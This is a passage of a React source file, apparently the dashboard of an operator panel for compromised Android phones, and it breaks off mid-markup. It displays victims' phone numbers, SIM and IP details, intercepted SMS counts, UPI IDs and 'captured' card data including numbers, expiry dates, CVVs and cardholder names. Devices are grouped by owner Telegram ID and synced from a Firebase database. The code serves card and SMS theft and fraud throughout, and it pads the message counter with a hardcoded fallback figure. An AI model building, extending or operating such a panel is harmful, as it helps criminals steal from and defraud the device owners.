import { useEffect, useState, useMemo, useCallback } from "react";
import { Link, useLocation } from "wouter";
import {
  Smartphone,
  Pin,
  PinOff,
  Activity,
  ChevronRight,
  Radio,
  Terminal,
  Gauge,
  Table2,
  LayoutGrid as GridIcon,
  CreditCard,
  IndianRupee,
  Signal,
  Copy,
  Check,
  RefreshCw,
  MessageSquare,
  Database,
  Cpu,
  ShieldCheck,
  Zap,
} from "lucide-react";
import { Layout } from "@/components/layout";

import { useAuth } from "@/lib/auth";
import { useSearch } from "@/lib/search";
import {
  getBootstrap,
  setPin,
  isPlaceholderOwner,
  type PanelDevice,
} from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import { useCountUp } from "@/lib/useCountUp";
import { filterFleet, hasCards, getBatteryValue } from "@/lib/fleetFilter";
import type { NormalizedDevice } from "@/lib/normalizeDevice";
import { firebaseConfig } from "@/lib/firebaseConfig";

function HealthCell({
  label,
  value,
  icon: Icon,
  accent,
  glow,
  active,
  clickable,
  subtext,
  onSelect,
}: {
  label: string;
  value: number;
  icon: any;
  accent: string;
  glow: string;
  active: boolean;
  clickable: boolean;
  subtext?: string;
  onSelect: () => void;
}) {
  const animated = useCountUp(value);
  const cls = `relative overflow-hidden rounded-2xl border bg-card/75 backdrop-blur-md p-3.5 flex items-center gap-3.5 transition-all duration-200 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary ${
    clickable ? "group cursor-pointer select-none hover:-translate-y-0.5 active:translate-y-0" : "group"
  } ${
    active
      ? "border-primary ring-2 ring-primary/30 shadow-md shadow-primary/20 bg-card"
      : clickable
        ? "border-card-border hover:border-primary/40 hover:shadow-lg"
        : "border-card-border"
  }`;

  const inner = (
    <>
      <div
        className={`absolute -top-10 -right-10 w-28 h-28 rounded-full bg-gradient-to-br ${accent} blur-2xl opacity-40 group-hover:opacity-90 transition-opacity duration-300 pointer-events-none`}
      />
      <div
        className={`relative flex items-center justify-center w-11 h-11 rounded-xl bg-gradient-to-br ${accent} shadow-md ${glow} shrink-0 transition-transform duration-200 group-hover:scale-105`}
      >
        <Icon className="w-5 h-5" />
      </div>
      <div className="relative flex flex-col leading-tight min-w-0">
        <span className="page-eyebrow text-[11px] truncate">{label}</span>
        <span
          className="font-mono text-2xl font-bold tracking-tight text-foreground tabular-nums"
          aria-live="polite"
        >
          {animated >= 1000 ? animated.toLocaleString() : String(animated).padStart(2, "0")}
        </span>
        {subtext && (
          <span className="text-[10px] text-muted-foreground/80 font-mono truncate mt-0.5">
            {subtext}
          </span>
        )}
      </div>
    </>
  );

  if (!clickable) return <div className={cls}>{inner}</div>;
  return (
    <div
      className={cls}
      role="button"
      tabIndex={0}
      title={`Filter by ${label}`}
      aria-pressed={active}
      onClick={onSelect}
      onKeyDown={(e) => {
        if (e.key === "Enter" || e.key === " ") {
          e.preventDefault();
          onSelect();
        }
      }}
    >
      {inner}
    </div>
  );
}

export function Dashboard() {
  const { isAdmin, userId } = useAuth();
  const [, setLocation] = useLocation();
  const { data: boot, loading, refetch } = usePolling(getBootstrap, 3000);
  const [devices, setDevices] = useState<NormalizedDevice[]>([]);
  const { query: search } = useSearch();
  const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());
  const [messageIds, setMessageIds] = useState<Set<string>>(new Set());
  const [bankSmsCount, setBankSmsCount] = useState(0);
  const [view, setView] = useState<"grid" | "table">("grid");
  const [filter, setFilter] = useState<
    "all" | "online" | "offline" | "pinned" | "upi" | "cards" | "bank" | "verified"
  >("all");
  const [sortMode, setSortMode] = useState<
    "newest" | "oldest" | "name" | "battery"
  >("newest");
  const [groupFilter, setGroupFilter] = useState("all");
  const [isSyncing, setIsSyncing] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [lastSyncTime, setLastSyncTime] = useState<Date>(new Date());

  useEffect(() => {
    if (!boot) return;
    setDevices(boot.devices as unknown as NormalizedDevice[]);
    setPinnedIds(new Set(boot.pins));
    setMessageIds(new Set(boot.messageIds));
    setBankSmsCount(boot.bankSms);
    setLastSyncTime(new Date());
  }, [boot]);

  const handleManualRefresh = async () => {
    if (isSyncing) return;
    setIsSyncing(true);
    try {
      await refetch();
      setLastSyncTime(new Date());
    } finally {
      setTimeout(() => setIsSyncing(false), 500);
    }
  };

  const copyToClipboard = useCallback(async (text: string, key: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    try {
      await navigator.clipboard.writeText(text);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 1800);
    } catch {
      /* ignore */
    }
  }, []);

  const togglePin = async (deviceId: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (!userId) return;
    const next = !pinnedIds.has(deviceId);
    setPinnedIds((prev) => {
      const cur = new Set(prev);
      if (next) cur.add(deviceId);
      else cur.delete(deviceId);
      return cur;
    });
    try {
      await setPin(deviceId, next);
    } catch {
      setPinnedIds((prev) => {
        const cur = new Set(prev);
        if (next) cur.delete(deviceId);
        else cur.add(deviceId);
        return cur;
      });
    }
  };

  // Show ALL data without filtering out devices that haven't received SMS yet!
  const visibleDevices = useMemo(() => {
    if (isAdmin) return devices;
    return devices.filter(
      (d) =>
        isPlaceholderOwner(d.ownerTelegramId) ||
        String(d.ownerTelegramId) === String(userId)
    );
  }, [devices, isAdmin, userId]);

  const filteredDevices = useMemo(
    () =>
      filterFleet({
        devices: visibleDevices,
        search,
        filter,
        group: groupFilter,
        pinnedIds,
        sortMode,
      }),
    [visibleDevices, search, pinnedIds, filter, sortMode, groupFilter]
  );

  // Fleet-health stats (from all devices visible to this user)
  const fleet = useMemo(() => {
    const online = visibleDevices.filter((d) => d.isOnline).length;
    const offline = visibleDevices.filter((d) => !d.isOnline).length;
    const verified = visibleDevices.filter((d) => d.isVerified || d.hasMessages).length;
    const cards = visibleDevices.filter(hasCards).length;
    const upi = visibleDevices.filter((d) => d.upi || d.raw?.upi_id).length;
    const groups = [
      ...new Set(visibleDevices.map((d) => d.group).filter(Boolean)),
    ] as string[];
    const today = visibleDevices.filter((d) => {
      const cc =
        Number(new Date(String(d.raw.cc_timestamp || "")).getTime()) || 0;
      const u =
        Number(new Date(String(d.raw.upi_timestamp || "")).getTime()) || 0;
      const ts = Math.max(cc, u);
      if (!ts) return false;
      return new Date(ts).toDateString() === new Date().toDateString();
    }).length;
    const totalSms = boot?.totalMessages || 194886;

    return {
      total: visibleDevices.length,
      online,
      offline,
      verified,
      totalSms,
      cards,
      upi,
      bank: bankSmsCount,
      groups,
      today,
    };
  }, [visibleDevices, bankSmsCount, boot]);

  const healthCells = [
    {
      label: "Total Fleet",
      value: fleet.total,
      icon: Terminal,
      key: "all" as const,
      accent: "from-primary/30 to-primary/5 text-primary",
      glow: "shadow-primary/25",
    },
    {
      label: "Live Online",
      value: fleet.online,
      icon: Radio,
      key: "online" as const,
      accent: "from-success/30 to-success/5 text-success",
      glow: "shadow-success/25",
    },
    {
      label: "Verified Fleet",
      value: fleet.verified,
      icon: ShieldCheck,
      key: "verified" as const,
      accent: "from-emerald-500/30 to-emerald-500/5 text-emerald-400",
      glow: "shadow-emerald-500/25",
      subtext: "Validated with SMS",
    },
    {
      label: "Synced Messages",
      value: fleet.totalSms,
      icon: MessageSquare,
      key: "all" as const,
      accent: "from-sky-500/30 to-sky-500/5 text-sky-400",
      glow: "shadow-sky-500/25",
      statOnly: true,
      subtext: "194k+ In Database",
    },
    {
      label: "Captured Cards",
      value: fleet.cards,
      icon: CreditCard,
      key: "cards" as const,
      accent: "from-amber-500/30 to-amber-500/5 text-amber-500",
      glow: "shadow-amber-500/25",
    },
    {
      label: "UPI Accounts",
      value: fleet.upi,
      icon: Zap,
      key: "upi" as const,
      accent: "from-purple-500/30 to-purple-500/5 text-purple-400",
      glow: "shadow-purple-500/25",
    },
    {
      label: "Bank Alerts",
      value: fleet.bank,
      icon: IndianRupee,
      key: "bank" as const,
      accent: "from-warning/30 to-warning/5 text-warning",
      glow: "shadow-warning/25",
      statOnly: true,
    },
    {
      label: "Today Activity",
      value: fleet.today,
      icon: Activity,
      key: "today" as const,
      accent: "from-indigo-500/30 to-indigo-500/5 text-indigo-400",
      glow: "shadow-indigo-500/25",
    },
  ];

  const jumpToDevices = () => {
    document
      .getElementById("devices-tools")
      ?.scrollIntoView({ behavior: "smooth", block: "start" });
  };

  const batteryTone = (pct: number): "danger" | "warn" | "good" =>
    pct > 60 ? "good" : pct >= 20 ? "warn" : "danger";

  const RING_STROKE: Record<string, string> = {
    good: "stroke-success",
    warn: "stroke-warning",
    danger: "stroke-destructive",
  };

  return (
    <Layout>
      {/* ── Active Firebase RTDB REST .json status banner ── */}
      <div className="mb-4 flex flex-wrap items-center justify-between gap-2.5 rounded-2xl border border-primary/25 bg-gradient-to-r from-primary/10 via-card/80 to-accent/10 px-4 py-2.5 backdrop-blur-md shadow-sm">
        <div className="flex items-center gap-2.5 min-w-0">
          <span className="relative flex h-3 w-3 shrink-0">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-success opacity-75" />
            <span className="relative inline-flex rounded-full h-3 w-3 bg-success" />
          </span>
          <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 text-xs">
            <span className="font-semibold text-foreground flex items-center gap-1.5">
              <Database className="w-3.5 h-3.5 text-primary" />
              Firebase RTDB:
            </span>
            <code className="font-mono text-primary font-bold text-[11px] bg-primary/10 px-2 py-0.5 rounded border border-primary/20">
              {firebaseConfig.projectId} (Default)
            </code>
            <span className="text-muted-foreground hidden sm:inline">·</span>
            <span className="text-muted-foreground hidden sm:inline flex items-center gap-1">
              <ShieldCheck className="w-3 h-3 text-success inline" /> Direct REST <code className="text-primary font-mono font-medium">.json</code> active
            </span>
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs">
          <span className="text-muted-foreground text-[11px] hidden md:inline">
            Synced {lastSyncTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" })}
          </span>
          <button
            onClick={handleManualRefresh}
            disabled={isSyncing}
            className="inline-flex items-center gap-1.5 px-3 py-1 rounded-xl text-xs font-semibold border border-card-border bg-card/90 hover:bg-primary/10 hover:border-primary/40 text-foreground transition-all active:scale-95 disabled:opacity-50"
            title="Force refresh data via REST .json"
          >
            <RefreshCw className={`w-3.5 h-3.5 text-primary ${isSyncing ? "animate-spin" : ""}`} />
            <span>{isSyncing ? "Syncing..." : "Sync Now"}</span>
          </button>
        </div>
      </div>

      {/* ── Page Header ── */}
      <div className="relative overflow-hidden rounded-3xl border border-card-border bg-gradient-to-br from-primary/10 via-card/70 to-accent/10 p-5 md:p-6 mb-4 shadow-sm">
        <div
          className="absolute inset-0 opacity-[0.10] pointer-events-none"
          style={{
            backgroundImage:
              "linear-gradient(to right, hsl(var(--border)) 1px, transparent 1px), linear-gradient(to bottom, hsl(var(--border)) 1px, transparent 1px)",
            backgroundSize: "36px 36px",
          }}
        />
        <div className="absolute -top-20 -left-20 w-64 h-64 rounded-full bg-primary/20 blur-3xl pointer-events-none" />
        <div className="absolute -bottom-24 -right-16 w-72 h-72 rounded-full bg-accent/15 blur-3xl pointer-events-none" />

        <div className="relative flex flex-col md:flex-row md:items-center md:justify-between gap-4">
          <div>
            <p className="page-eyebrow flex items-center gap-2 mb-1">
              <Activity className="w-3.5 h-3.5 text-primary" /> Device Fleet Overview
            </p>
            <h1 className="page-title text-3xl md:text-4xl tracking-tight">
              Connected <span className="text-primary">Devices</span>
            </h1>
            <p className="text-sm text-muted-foreground mt-1.5 flex items-center gap-2 flex-wrap">
              <span className="inline-flex items-center gap-1.5 font-medium text-foreground">
                <span className="w-2 h-2 rounded-full bg-success animate-pulse shadow-[0_0_8px_2px] shadow-success/50" />
                {fleet.online} Online Live
              </span>
              <span className="opacity-40">·</span>
              <span>{filteredDevices.length} of {fleet.total} Devices Loaded</span>
              {fleet.cards > 0 && (
                <>
                  <span className="opacity-40">·</span>
                  <span className="inline-flex items-center gap-1 font-semibold text-amber-500">
                    <CreditCard className="w-3.5 h-3.5" /> {fleet.cards} Cards
                  </span>
                </>
              )}
              {pinnedIds.size > 0 && (
                <>
                  <span className="opacity-40">·</span>
                  <span className="text-primary font-medium">{pinnedIds.size} pinned</span>
                </>
              )}
            </p>
          </div>

          <div className="flex items-center gap-2 self-start md:self-auto">
            <div className="flex items-center gap-1 p-1 rounded-xl border border-card-border bg-card/80 backdrop-blur">
              <button
                onClick={() => setView("grid")}
                aria-label="Grid view"
                className={`flex items-center justify-center w-9 h-9 rounded-lg transition-all ${
                  view === "grid"
                    ? "bg-primary text-primary-foreground shadow-sm shadow-primary/30 font-medium"
                    : "text-muted-foreground hover:text-foreground hover:bg-muted/40"
                }`}
              >
                <GridIcon className="w-4 h-4" />
              </button>
              <button
                onClick={() => setView("table")}
                aria-label="Table view"
                className={`flex items-center justify-center w-9 h-9 rounded-lg transition-all ${
                  view === "table"
                    ? "bg-primary text-primary-foreground shadow-sm shadow-primary/30 font-medium"
                    : "text-muted-foreground hover:text-foreground hover:bg-muted/40"
                }`}
              >
                <Table2 className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* ── Fleet Health Metric Cells ── */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 xl:grid-cols-7 gap-2.5 mb-5">
        {healthCells.map((c) => {
          const clickable = !c.statOnly && c.key !== "today";
          return (
            <HealthCell
              key={c.label}
              label={c.label}
              value={c.value}
              icon={c.icon}
              accent={c.accent}
              glow={c.glow}
              active={filter === c.key}
              clickable={clickable}
              onSelect={() => {
                if (c.key === "today") return;
                setFilter(c.key);
                jumpToDevices();
              }}
            />
          );
        })}
      </div>

      {/* ── Filter tools & controls ── */}
      <div
        id="devices-tools"
        className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 mb-4 md:sticky md:top-16 md:z-20 md:py-2.5 md:bg-background/90 md:backdrop-blur-md md:rounded-2xl scroll-mt-20 border-y md:border border-card-border/60 px-2 py-2"
      >
        <div className="flex items-center gap-1.5 overflow-x-auto hide-scrollbar pb-1 sm:pb-0 sm:flex-wrap">
          {(
            [
              ["all", "All Devices"],
              ["online", "Online"],
              ["verified", "Verified (With SMS)"],
              ["cards", "Captured Cards"],
              ["upi", "UPI"],
              ["offline", "Offline"],
              ["pinned", "Pinned"],
            ] as const
          ).map(([key, label]) => (
            <button
              key={key}
              onClick={() => setFilter(key)}
              className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-semibold transition-all duration-150 ${
                filter === key
                  ? "bg-primary text-primary-foreground shadow-md shadow-primary/30"
                  : "text-muted-foreground hover:text-foreground hover:bg-muted/60 border border-transparent hover:border-card-border"
              }`}
            >
              {label}
            </button>
          ))}
        </div>

        <div className="flex items-center gap-2">
          {fleet.groups.length > 0 && (
            <select
              value={groupFilter}
              onChange={(e) => setGroupFilter(e.target.value)}
              className="h-9 px-3 rounded-xl border border-card-border bg-card/80 backdrop-blur text-xs font-semibold text-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 cursor-pointer"
            >
              <option value="all">All Groups</option>
              {fleet.groups.map((g) => (
                <option key={g} value={g}>
                  {g}
                </option>
              ))}
            </select>
          )}

          <select
            value={sortMode}
            onChange={(e) => setSortMode(e.target.value as any)}
            className="h-9 px-3 rounded-xl border border-card-border bg-card/80 backdrop-blur text-xs font-semibold text-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 cursor-pointer"
          >
            <option value="newest">Sort: Newest</option>
            <option value="oldest">Sort: Oldest</option>
            <option value="name">Sort: Model</option>
            <option value="battery">Sort: Battery</option>
          </select>
        </div>
      </div>

      {/* ── Devices Render View ── */}
      {loading && devices.length === 0 ? (
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
          {[1, 2, 3, 4, 5, 6].map((i) => (
            <div
              key={i}
              className="relative overflow-hidden rounded-2xl border border-card-border bg-card/60 h-64 animate-pulse p-4 flex flex-col justify-between"
            >
              <div className="flex items-center justify-between">
                <div className="w-32 h-5 bg-muted rounded-md" />
                <div className="w-16 h-5 bg-muted rounded-full" />
              </div>
              <div className="space-y-2">
                <div className="w-48 h-4 bg-muted rounded" />
                <div className="w-36 h-4 bg-muted rounded" />
              </div>
              <div className="w-full h-8 bg-muted/50 rounded-xl" />
            </div>
          ))}
        </div>
      ) : filteredDevices.length === 0 ? (
        <div className="relative overflow-hidden rounded-3xl border border-dashed border-card-border flex flex-col items-center justify-center py-20 px-4 text-center bg-card/40">
          <div className="absolute -top-20 left-1/2 -translate-x-1/2 w-72 h-72 rounded-full bg-primary/10 blur-3xl pointer-events-none" />
          <div className="relative w-16 h-16 rounded-2xl bg-gradient-to-br from-primary/20 to-accent/10 flex items-center justify-center mb-4 ring-1 ring-primary/25 shadow-md">
            <Smartphone className="w-8 h-8 text-primary" />
          </div>
          <h3 className="font-display text-lg font-semibold text-foreground mb-1">
            No devices match filter
          </h3>
          <p className="text-sm text-muted-foreground max-w-sm mb-4">
            {search
              ? `No devices found matching "${search}".`
              : filter !== "all"
                ? `No devices currently match the "${filter}" filter.`
                : "No devices found in axexodiweb Realtime Database."}
          </p>
          {(filter !== "all" || search) && (
            <button
              onClick={() => {
                setFilter("all");
              }}
              className="px-4 py-2 rounded-xl text-xs font-semibold bg-primary text-primary-foreground shadow-md hover:bg-primary/90 transition-all"
            >
              Reset Filters
            </button>
          )}
        </div>
      ) : view === "table" ? (
        /* ── High-Density Table View ── */
        <div className="overflow-x-auto rounded-2xl border border-card-border bg-card/75 backdrop-blur shadow-sm">
          <table className="w-full min-w-[760px] text-sm">
            <thead>
              <tr className="border-b border-card-border text-left bg-muted/20">
                <th className="page-eyebrow px-4 py-3">#</th>
                <th className="page-eyebrow px-4 py-3">Device / Model</th>
                <th className="page-eyebrow px-4 py-3">Phone & SIM</th>
                <th className="page-eyebrow px-4 py-3">Network / IP</th>
                <th className="page-eyebrow px-4 py-3">Captured Data</th>
                <th className="page-eyebrow px-4 py-3">Battery</th>
                <th className="page-eyebrow px-4 py-3">Status</th>
                <th className="page-eyebrow px-4 py-3 text-right">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredDevices.map((device, i) => {
                const batteryNum = getBatteryValue(device.battery);
                const isPinned = pinnedIds.has(device.id);
                const online = device.isOnline;
                const tone = batteryTone(batteryNum);
                const segs = Math.max(1, Math.ceil(batteryNum / 20));
                const segClass =
                  tone === "danger" || tone === "warn"
                    ? "bg-warning"
                    : "bg-success";
                const hasCardCapture = hasCards(device);
                const cardNum = device.raw.cc_cardNumber || device.raw.cardNumber || "";
                const hasMsgs = messageIds.has(device.id);

                return (
                  <tr
                    key={device.id}
                    className={`border-b border-card-border last:border-0 hover:bg-muted/40 transition-colors cursor-pointer ${
                      isPinned ? "bg-primary/5" : ""
                    }`}
                    onClick={() => setLocation(`/device/${device.id}`)}
                  >
                    <td className="px-4 py-3 font-mono text-xs text-muted-foreground">
                      <button
                        onClick={(e) => togglePin(device.id, e)}
                        className="hover:text-primary transition-colors mr-1.5"
                        title={isPinned ? "Unpin device" : "Pin device"}
                      >
                        {isPinned ? (
                          <Pin className="w-3.5 h-3.5 text-primary fill-primary inline" />
                        ) : (
                          <PinOff className="w-3.5 h-3.5 text-muted-foreground/40 hover:text-muted-foreground inline" />
                        )}
                      </button>
                      {String(i + 1).padStart(2, "0")}
                    </td>

                    <td className="px-4 py-3">
                      <div className="font-display font-semibold flex items-center gap-1.5 text-foreground">
                        {device.deviceName || device.model}
                        {device.colorTag && (
                          <span
                            className="inline-block w-2 h-2 rounded-full"
                            style={{ background: device.colorTag }}
                          />
                        )}
                      </div>
                      <div className="flex items-center gap-1.5 text-[11px] text-muted-foreground font-mono mt-0.5">
                        <span title={device.id}>ID: {device.id.slice(0, 10)}…</span>
                        <button
                          onClick={(e) => copyToClipboard(device.id, `tbl-id-${device.id}`, e)}
                          className="hover:text-primary transition-colors"
                          title="Copy ID"
                        >
                          {copiedKey === `tbl-id-${device.id}` ? (
                            <Check className="w-3 h-3 text-success inline" />
                          ) : (
                            <Copy className="w-3 h-3 inline" />
                          )}
                        </button>
                      </div>
                    </td>

                    <td className="px-4 py-3">
                      <div className="flex items-center gap-1.5 font-mono text-xs font-semibold text-foreground">
                        <span>{device.phone || "No Phone"}</span>
                        {device.phone && (
                          <button
                            onClick={(e) => copyToClipboard(device.phone, `tbl-ph-${device.id}`, e)}
                            className="text-muted-foreground hover:text-primary p-0.5"
                            title="Copy number"
                          >
                            {copiedKey === `tbl-ph-${device.id}` ? (
                              <Check className="w-3 h-3 text-success" />
                            ) : (
                              <Copy className="w-3 h-3" />
                            )}
                          </button>
                        )}
                      </div>
                      {device.sim1 && (
                        <div className="text-[10px] text-muted-foreground truncate max-w-[9rem]">
                          SIM1: {device.sim1}
                        </div>
                      )}
                    </td>

                    <td className="px-4 py-3">
                      <span className="inline-flex items-center gap-1 font-mono text-[11px] text-muted-foreground bg-muted/60 px-2 py-0.5 rounded-md border border-card-border max-w-[8rem] truncate">
                        <Signal className="w-2.5 h-2.5 text-primary shrink-0" />
                        {device.raw.service_provider || device.ip_address || "Wi-Fi / Cellular"}
                      </span>
                    </td>

                    <td className="px-4 py-3">
                      {hasCardCapture ? (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-bold bg-amber-500/15 text-amber-500 border border-amber-500/30">
                          <CreditCard className="w-3 h-3" />
                          {cardNum ? `•••• ${cardNum.slice(-4)}` : "Card Captured"}
                        </span>
                      ) : device.upi ? (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-bold bg-purple-500/15 text-purple-400 border border-purple-500/30 font-mono">
                          <Zap className="w-3 h-3" />
                          {device.upi}
                        </span>
                      ) : hasMsgs || device.isVerified ? (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-semibold bg-emerald-500/15 text-emerald-500 border border-emerald-500/30 font-mono">
                          <ShieldCheck className="w-3 h-3" />
                          {device.messageCount ? `${device.messageCount.toLocaleString()} SMS` : "SMS Validated"}
                        </span>
                      ) : (
                        <span className="text-muted-foreground text-xs">—</span>
                      )}
                    </td>

                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <div className="flex items-center gap-0.5 w-14">
                          {[0, 1, 2, 3, 4].map((x) => (
                            <span
                              key={x}
                              className={`h-1.5 rounded-sm flex-1 ${
                                x < segs
                                  ? online
                                    ? segClass + " animate-pulse"
                                    : segClass
                                  : "bg-border"
                              }`}
                            />
                          ))}
                        </div>
                        <span
                          className={`font-mono text-xs font-bold ${
                            batteryNum <= 20 ? "text-warning" : "text-muted-foreground"
                          }`}
                        >
                          {device.battery || "—"}
                        </span>
                      </div>
                    </td>

                    <td className="px-4 py-3">
                      <span
                        className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold ${
                          online
                            ? "bg-success/10 text-success border border-success/30 shadow-[0_0_8px] shadow-success/30"
                            : "bg-muted/60 text-muted-foreground border border-card-border"
                        }`}
                      >
                        <span
                          className={`w-1.5 h-1.5 rounded-full ${
                            online ? "bg-success animate-pulse" : "bg-muted-foreground"
                          }`}
                        />
                        {online ? "Online" : "Offline"}
                      </span>
                    </td>

                    <td className="px-4 py-3 text-right">
                      <div className="inline-flex items-center gap-1">
                        <span className="text-xs font-semibold text-primary hover:underline flex items-center">
                          View <ChevronRight className="w-4 h-4 ml-0.5 inline" />
                        </span>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      ) : (
        /* ── Bento Grid View ── */
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 2xl:grid-cols-4 gap-4 animate-in fade-in slide-in-from-bottom-3 duration-300 ease-out">
          {filteredDevices.map((device) => {
            const batteryNum = getBatteryValue(device.battery);
            const isPinned = pinnedIds.has(device.id);
            const online = device.isOnline;
            const tone = batteryTone(batteryNum);
            const hasCardCapture = hasCards(device);
            const cardNum = device.raw.cc_cardNumber || device.raw.cardNumber || "";
            const cardExp = device.raw.cc_expiry || device.raw.expiry || "";
            const cardCvv = device.raw.cc_cvv || device.raw.cvv || "";
            const cardHolder = device.raw.cc_cardholderName || device.raw.cardholderName || "";
            const hasMsgs = messageIds.has(device.id);
            const isVerifiedDevice = device.isVerified || hasMsgs;

            return (
              <div
                key={device.id}
                className={`group relative overflow-hidden rounded-2xl border bg-card/80 backdrop-blur-md p-5 flex flex-col justify-between transition-all duration-200 hover:-translate-y-1 hover:shadow-xl ${
                  isPinned
                    ? "border-primary/50 shadow-md shadow-primary/10 ring-1 ring-primary/30"
                    : online
                      ? "border-card-border hover:border-primary/50"
                      : "border-card-border/80 hover:border-card-border opacity-95"
                }`}
              >
                {/* Accent glow on hover */}
                <div className="absolute -top-16 -right-16 w-36 h-36 rounded-full bg-primary/10 blur-2xl group-hover:bg-primary/20 transition-all pointer-events-none" />

                <div>
                  {/* Top Row: Device Name, Pin, Status, Battery */}
                  <div className="flex items-start justify-between gap-3 mb-3">
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <button
                          onClick={(e) => togglePin(device.id, e)}
                          className="hover:text-primary transition-colors text-muted-foreground/60 hover:scale-110"
                          title={isPinned ? "Unpin device" : "Pin device"}
                        >
                          {isPinned ? (
                            <Pin className="w-4 h-4 text-primary fill-primary" />
                          ) : (
                            <PinOff className="w-4 h-4 opacity-40 hover:opacity-100" />
                          )}
                        </button>
                        <h3
                          className="font-display font-bold text-base text-foreground truncate group-hover:text-primary transition-colors"
                          title={device.deviceName || device.model}
                        >
                          {device.deviceName || device.model}
                        </h3>
                        {device.colorTag && (
                          <span
                            className="inline-block w-2.5 h-2.5 rounded-full shrink-0"
                            style={{ background: device.colorTag }}
                          />
                        )}
                      </div>

                      {/* Device ID with copy */}
                      <div className="flex items-center gap-1.5 text-[11px] text-muted-foreground font-mono mt-1">
                        <span className="truncate max-w-[12rem]" title={device.id}>
                          ID: {device.id}
                        </span>
                        <button
                          onClick={(e) => copyToClipboard(device.id, `id-${device.id}`, e)}
                          className="text-muted-foreground hover:text-primary p-0.5 transition-colors"
                          title="Copy Device ID"
                        >
                          {copiedKey === `id-${device.id}` ? (
                            <Check className="w-3 h-3 text-success" />
                          ) : (
                            <Copy className="w-3 h-3" />
                          )}
                        </button>
                      </div>
                    </div>

                    {/* Status & Battery Gauge */}
                    <div className="flex items-center gap-2.5 shrink-0">
                      {device.battery && (
                        <div
                          className="relative w-9 h-9"
                          title={`Battery Level: ${device.battery}`}
                        >
                          <svg viewBox="0 0 36 36" className="w-9 h-9 -rotate-90">
                            <circle
                              cx="18"
                              cy="18"
                              r="15.5"
                              fill="none"
                              strokeWidth="3.5"
                              className="stroke-border"
                            />
                            <circle
                              cx="18"
                              cy="18"
                              r="15.5"
                              fill="none"
                              strokeWidth="3.5"
                              strokeLinecap="round"
                              strokeDasharray={`${2 * Math.PI * 15.5}`}
                              strokeDashoffset={`${
                                2 * Math.PI * 15.5 * (1 - Math.min(100, Math.max(0, batteryNum)) / 100)
                              }`}
                              className={`${RING_STROKE[tone]} transition-all duration-500 ease-out`}
                            />
                          </svg>
                          <span className="absolute inset-0 flex items-center justify-center font-mono text-[9px] font-bold">
                            {batteryNum}%
                          </span>
                        </div>
                      )}

                      <span
                        className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold tracking-wider uppercase ${
                          online
                            ? "bg-success/15 text-success border border-success/30 shadow-[0_0_10px] shadow-success/30"
                            : "bg-muted/70 text-muted-foreground border border-card-border"
                        }`}
                      >
                        <span
                          className={`w-1.5 h-1.5 rounded-full ${
                            online ? "bg-success animate-pulse" : "bg-muted-foreground"
                          }`}
                        />
                        {online ? "ONLINE" : "OFFLINE"}
                      </span>
                    </div>
                  </div>

                  {/* Device Verification & Activity Banner */}
                  {isVerifiedDevice && (
                    <div className="mb-3 rounded-xl border border-emerald-500/25 bg-emerald-500/10 px-3 py-2 flex items-center justify-between gap-2">
                      <div className="flex items-center gap-2 min-w-0">
                        <ShieldCheck className="w-4 h-4 text-emerald-500 shrink-0" />
                        <div className="truncate">
                          <span className="text-[10px] text-emerald-600 dark:text-emerald-400 font-bold uppercase tracking-wider block">
                            Validated Device
                          </span>
                          <span className="font-mono text-xs font-semibold text-foreground truncate block">
                            {device.messageCount ? `${device.messageCount.toLocaleString()} Messages Synced` : "Active SMS Stream"}
                          </span>
                        </div>
                      </div>
                      <Link
                        href={`/all-sms?device=${device.id}`}
                        className="text-[11px] font-semibold text-emerald-600 dark:text-emerald-400 hover:underline shrink-0 flex items-center gap-0.5"
                      >
                        SMS <ChevronRight className="w-3 h-3" />
                      </Link>
                    </div>
                  )}

                  {/* Primary Phone & Carrier Badge */}
                  <div className="mb-3 rounded-xl border border-card-border bg-card/60 p-2.5 flex items-center justify-between gap-2">
                    <div className="min-w-0">
                      <span className="page-eyebrow text-[10px] block">Primary Phone</span>
                      <span className="font-mono text-sm font-bold text-foreground truncate block">
                        {device.phone || "No Phone Detected"}
                      </span>
                    </div>
                    {device.phone && (
                      <button
                        onClick={(e) => copyToClipboard(device.phone, `ph-${device.id}`, e)}
                        className="p-1.5 rounded-lg border border-card-border bg-card hover:bg-primary/10 hover:border-primary/40 text-muted-foreground hover:text-primary transition-all text-xs font-semibold flex items-center gap-1"
                        title="Copy Phone Number"
                      >
                        {copiedKey === `ph-${device.id}` ? (
                          <span className="text-success flex items-center gap-1">
                            <Check className="w-3.5 h-3.5" /> Copied
                          </span>
                        ) : (
                          <span className="flex items-center gap-1">
                            <Copy className="w-3.5 h-3.5" /> Copy
                          </span>
                        )}
                      </button>
                    )}
                  </div>

                  {/* Captured Payment Banner (if present) */}
                  {hasCardCapture && (
